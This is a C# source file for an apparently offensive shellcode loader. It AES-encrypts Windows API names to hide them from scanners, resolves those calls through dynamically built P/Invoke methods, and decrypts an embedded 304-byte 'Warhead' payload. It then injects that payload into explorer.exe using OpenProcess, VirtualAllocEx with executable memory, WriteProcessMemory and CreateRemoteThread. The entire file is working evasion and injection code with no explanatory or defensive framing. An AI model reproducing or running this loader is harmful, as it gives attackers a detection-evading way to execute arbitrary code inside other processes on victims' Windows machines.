using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Reflection.Emit;
using System.Security.Cryptography;
using System.IO;
using System.Text;

namespace AES_Process_Injection_Dynamic_Invoke
{
    class Program {

        static string GlobalKey = "NBg0NGeY4e/B7fZED4GLQ8YSAa+h+p8iJoIwnoc5HSw=";
        static string GlobalIV = "KJLek0E1nKfTfhYxlQjy0A==";

        static byte[] dKernel32_dll_Bytes = new byte[16] { 0x8D, 0x10, 0xC6, 0x91, 0x9B, 0x5F, 0xE2, 0x61, 0x7D, 0xD9, 0x45, 0xC7, 0xF6, 0x35, 0x82, 0xE6 };
        static string dKernel32_dll = DecryptAESAsString(dKernel32_dll_Bytes, GlobalKey, GlobalIV);

        static byte[] dOpenProcess_Bytes = new byte[16] { 0x79, 0x2A, 0x44, 0x6A, 0x5E, 0xF7, 0xA2, 0xE2, 0x66, 0x58, 0xC5, 0xF3, 0x94, 0xE7, 0x01, 0x04 };
        static string dOpenProcess = DecryptAESAsString(dOpenProcess_Bytes, GlobalKey, GlobalIV);

        static byte[] dVirtualAllocEx_Bytes = new byte[16] { 0x64, 0x67, 0xDC, 0x45, 0x14, 0xE6, 0xF3, 0x13, 0x52, 0x1A, 0x7B, 0xEE, 0xED, 0x7A, 0x27, 0x87 };
        static string dVirtualAllocEx = DecryptAESAsString(dVirtualAllocEx_Bytes, GlobalKey, GlobalIV);

        static byte[] dReadProcessMemory_Bytes = new byte[32] { 0x4E, 0x98, 0x92, 0xF9, 0xF4, 0x32, 0x27, 0x8C, 0x4A, 0xF5, 0x24, 0xE8, 0x95, 0x61, 0xB5, 0xB6, 0xD6, 0x19, 0xFE, 0x10, 0x1B, 0x5A, 0xD3, 0x5E, 0xD6, 0x36, 0x8F, 0x20, 0xCE, 0xE8, 0xE0, 0x0E };
        static string dReadProcessMemory = DecryptAESAsString(dReadProcessMemory_Bytes, GlobalKey, GlobalIV);

        static byte[] dWriteProcessMemory_Bytes = new byte[32] { 0xE8, 0xAB, 0x8E, 0x58, 0x02, 0xC5, 0x4D, 0x7E, 0x7A, 0xAA, 0xBA, 0x8E, 0x42, 0xAD, 0x2C, 0x89, 0xEF, 0xCB, 0x4A, 0x95, 0x09, 0xA1, 0x03, 0xB8, 0xEC, 0x70, 0xDA, 0xAD, 0x06, 0x11, 0x54, 0x4D };
        static string dWriteProcessMemory = DecryptAESAsString(dWriteProcessMemory_Bytes, GlobalKey, GlobalIV);

        static byte[] dCreateRemoteThread_Bytes = new byte[32] { 0xA6, 0xFA, 0xAE, 0x8C, 0xF0, 0xB2, 0xAA, 0xC2, 0x5A, 0x89, 0x51, 0x3C, 0xF4, 0x11, 0x98, 0xE7, 0x41, 0x30, 0x88, 0xBF, 0xF0, 0x77, 0x9C, 0xB8, 0x21, 0x57, 0x3D, 0x7C, 0x21, 0xC8, 0x7B, 0x75 };
        static string dCreateRemoteThread = DecryptAESAsString(dCreateRemoteThread_Bytes, GlobalKey, GlobalIV);

        public static IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId) {
            var paramterTypes = new Type[] { typeof(uint), typeof(bool), typeof(uint) };
            var argumentTypes = new object[] { processAccess, bInheritHandle, processId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dOpenProcess, argumentTypes, paramterTypes);
        }

        public static IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect) {
            var paramterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(uint), typeof(uint) };
            var argumentTypes = new object[] { hProcess, lpAddress, dwSize, flAllocationType, flProtect };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dVirtualAllocEx, argumentTypes, paramterTypes);
        }

        public static bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead) {
            var paramterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(byte[]), typeof(int), typeof(IntPtr).MakeByRefType() };
            var argumentTypes = new object[] { hProcess, lpBaseAddress, lpBuffer, dwSize, IntPtr.Zero };

            bool result = (bool)DynamicInvoke(typeof(bool), dKernel32_dll, dReadProcessMemory, argumentTypes, paramterTypes);

            lpNumberOfBytesRead = (IntPtr)argumentTypes[4];
            return result;
        }

        public static bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten) {
            var paramterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(byte[]), typeof(int), typeof(IntPtr).MakeByRefType() };
            var argumentTypes = new object[] { hProcess, lpBaseAddress, lpBuffer, nSize, IntPtr.Zero };

            bool result = (bool)DynamicInvoke(typeof(bool), dKernel32_dll, dWriteProcessMemory, argumentTypes, paramterTypes);

            lpNumberOfBytesWritten = (IntPtr)argumentTypes[4];
            return result;
        }

        public static IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId) {
            var paramterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
            var argumentTypes = new object[] { hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dCreateRemoteThread, argumentTypes, paramterTypes);
        }
        static void Main(string[] argumentTypes) {
            byte[] Warhead_Bytes = new byte[304] { 0x4C, 0x1E, 0x97, 0x81, 0xBC, 0xCD, 0x36, 0x58, 0x72, 0xCF, 0x42, 0x97, 0x7B, 0x5C, 0x81, 0x9B, 0x44, 0x43, 0x03, 0x2D, 0x81, 0xF1, 0x2F, 0x14, 0xA8, 0xD8, 0xB6, 0x13, 0x1F, 0x03, 0xC0, 0xC9, 0x06, 0x45, 0xE6, 0x0D, 0x00, 0x2A, 0x77, 0xFE, 0x0A, 0xC0, 0x51, 0xF1, 0x93, 0x0C, 0x5E, 0x6E, 0x1B, 0xC9, 0x2F, 0x6D, 0xD4, 0x10, 0xDD, 0x2F, 0x75, 0x9A, 0xB5, 0x5B, 0x22, 0x7C, 0x52, 0xD2, 0xB8, 0xC7, 0x9B, 0x02, 0xAC, 0x7E, 0xBF, 0x68, 0x83, 0xF9, 0xBB, 0x82, 0xD1, 0x65, 0xFC, 0xEB, 0x7C, 0xDB, 0xC8, 0x92, 0xFB, 0x53, 0x57, 0xA6, 0x54, 0x3B, 0x35, 0x5A, 0x38, 0x80, 0x61, 0x55, 0xE2, 0xC8, 0xDD, 0xDA, 0x14, 0x33, 0xB5, 0x4B, 0xB8, 0x34, 0xAE, 0x1C, 0x1D, 0x7C, 0xA9, 0x48, 0x9E, 0xB3, 0xAE, 0x5E, 0x6F, 0xD3, 0xA4, 0xA7, 0x9B, 0x78, 0xB2, 0x78, 0x3A, 0xF2, 0xFD, 0xE8, 0x52, 0xD0, 0x9B, 0xB6, 0x02, 0x8B, 0xEE, 0xA9, 0xEF, 0x63, 0xE3, 0x1F, 0xFA, 0x2A, 0x85, 0x01, 0xF3, 0xA5, 0x3D, 0xD7, 0x55, 0x79, 0x4F, 0xB4, 0xAE, 0x8A, 0x4D, 0x43, 0x27, 0x6D, 0xB3, 0xBA, 0x73, 0x6A, 0x2C, 0xCF, 0xA6, 0x03, 0x7B, 0x40, 0xC1, 0xFE, 0xDA, 0x6C, 0x33, 0x59, 0xD5, 0x3E, 0xC5, 0xBD, 0x86, 0xCF, 0x76, 0xC1, 0xF0, 0xF1, 0x5A, 0x3F, 0x39, 0x92, 0xD7, 0xBA, 0x5F, 0xDA, 0xD8, 0x81, 0x78, 0xF6, 0x30, 0x18, 0x70, 0xA2, 0x04, 0x44, 0xD7, 0xA1, 0xFE, 0xED, 0x9E, 0xB6, 0x29, 0xAB, 0x7F, 0x9E, 0x77, 0xF5, 0xDA, 0x14, 0x7D, 0xB5, 0xDA, 0x42, 0x8A, 0xB2, 0x9F, 0x36, 0x70, 0xC5, 0x72, 0x13, 0x1D, 0x9C, 0xB6, 0xA2, 0xC2, 0x66, 0xE8, 0xE7, 0x84, 0xEB, 0x03, 0x46, 0x8D, 0x79, 0xB8, 0x28, 0x02, 0x09, 0xAB, 0xCB, 0xCC, 0x61, 0x30, 0xBA, 0xE7, 0x41, 0x23, 0x43, 0xC1, 0xBD, 0x02, 0xE2, 0xAB, 0x67, 0xAC, 0xB2, 0xC7, 0xC4, 0x56, 0x32, 0x67, 0x37, 0xBE, 0x18, 0x99, 0x8A, 0x59, 0x98, 0x0C, 0x8E, 0xA8, 0xFE, 0xAA, 0x29, 0xC9, 0x99, 0x2C, 0x1F, 0x63, 0x7D, 0x5C, 0x32, 0x9E, 0x37, 0xC2, 0xAE, 0xCE, 0x40, 0x77, 0xB9, 0x28, 0x86, 0x83, 0x6B, 0x3F, 0xDF };
            byte[] Warhead = DecryptAESAsBytes(Warhead_Bytes, "MeV1w5NXp6srqE5/qDN0lSLfu9J4opVHRcoYR1mmBzk=", "hTFZdUSVkNnMMRnI5uG36A==");

            var processes = Process.GetProcessesByName("explorer");
            System.Diagnostics.Process sprocess = processes[0];

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, (uint)sprocess.Id);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, Warhead, Warhead.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }

        public static object DynamicInvoke(Type returnType, string library, string methodName, object[] arguments, Type[] parameterTypes) {
            var assemblyName = new AssemblyName("DynamicAssembly");
            var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

            var methodBuilder = moduleBuilder.DefinePInvokeMethod(
                methodName,
                library,
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
                CallingConventions.Standard,
                returnType,
                parameterTypes,
                CallingConvention.Winapi,
                CharSet.Ansi
            );

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();
            MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

            return dynamicMethod.Invoke(null, arguments);
        }

        static string DecryptAESAsString(byte[] data, string keyBase64, string ivBase64) {
            byte[] decryptedBytes = DecryptAESAsBytes(data, keyBase64, ivBase64);
            return Encoding.UTF8.GetString(decryptedBytes);
        }

        static byte[] DecryptAESAsBytes(byte[] data, string keyBase64, string ivBase64) {

            byte[] key = Convert.FromBase64String(keyBase64);
            byte[] iv = Convert.FromBase64String(ivBase64);

            using (Aes aes = Aes.Create()) {
                aes.Key = key;
                aes.IV = iv;

                using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                using (MemoryStream memoryStream = new MemoryStream(data))
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read)) {
                    byte[] decryptedBytes = new byte[data.Length];
                    int decryptedByteCount = cryptoStream.Read(decryptedBytes, 0, decryptedBytes.Length);

                    byte[] result = new byte[decryptedByteCount];
                    Array.Copy(decryptedBytes, result, decryptedByteCount);
                    return result;
                }
            }
        }
    }
}
